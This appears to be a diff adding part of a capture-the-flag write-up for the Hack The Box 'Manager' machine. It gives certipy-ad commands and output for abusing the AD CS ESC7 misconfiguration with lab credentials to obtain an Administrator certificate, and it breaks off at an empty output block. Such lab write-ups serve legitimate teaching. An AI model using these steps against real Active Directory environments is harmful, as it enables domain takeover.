@@ -674,4 +674,68 @@ Certificate Authorities
       ESC7                              : User has dangerous permissions.
 ```
 
-The vulnerabilities section has identified ESC7 - An Active Directory Certificate Services attack.
+The Vulnerabilities section has identified:
+
+1. ESC7 - An Active Directory Certificate Services attack.
+2. The CA Name - manager-DC01-CA.
+3. That Raven is in the ManageCertificates section.
+
+ESC7 allows us to abuse the Certificate Authority and obtain a certificate that we would not normally be able to obtain.
+
+The following steps showcase the exploitation of ESC7:
+
+#### Add Raven as a CA Officer
+
+```
+certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -add-officer raven
+```
+
+#### Output:
+
+```
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+```
+
+#### Enable the SubCA template:
+
+```
+ertipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -enable-template SubCA
+```
+
+#### Output:
+
+```
+[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+```
+
+#### Request Administrator's certificate:
+
+```
+certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -template SubCA -upn administrator@manager.htb
+```
+
+#### Output:
+
+```
+[*] Requesting certificate via RPC
+[*] Request ID is 19
+[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+Would you like to save the private key? (y/N): y
+[*] Saving private key to '19.key'
+[*] Wrote private key to '19.key'
+[-] Failed to request certificate
+```
+
+This fails but we must take note of the Request ID, which is 19 in this case.
+
+#### Override the rejection and Approve the Certificate Request:
+
+```
+certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -issue-request 19
+```
+
+#### Output:
+
+```
+
+```
